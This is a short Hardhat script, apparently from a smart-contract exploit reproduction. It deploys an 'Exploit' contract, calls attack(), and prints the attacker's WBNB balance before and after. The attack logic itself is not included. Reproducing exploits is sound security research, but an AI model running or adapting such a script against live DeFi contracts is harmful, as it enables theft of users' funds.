import hre from "hardhat"
import {Exploit__factory, IERC20__factory} from "../typechain";

async function main() {
    const [signer] = await hre.ethers.getSigners();
    const wbnb = IERC20__factory.connect("0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",signer);
    const exploit = await new Exploit__factory(signer).deploy();

    console.log("WBNB balance of attacker:",hre.ethers.utils.formatUnits(await wbnb.balanceOf(signer.address),await wbnb.decimals()))
    console.log("Exploiting...")
    await exploit.attack();
    console.log("Exploit complete.")
    console.log("WBNB balance of attacker:",hre.ethers.utils.formatUnits(await wbnb.balanceOf(signer.address),await wbnb.decimals()))
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});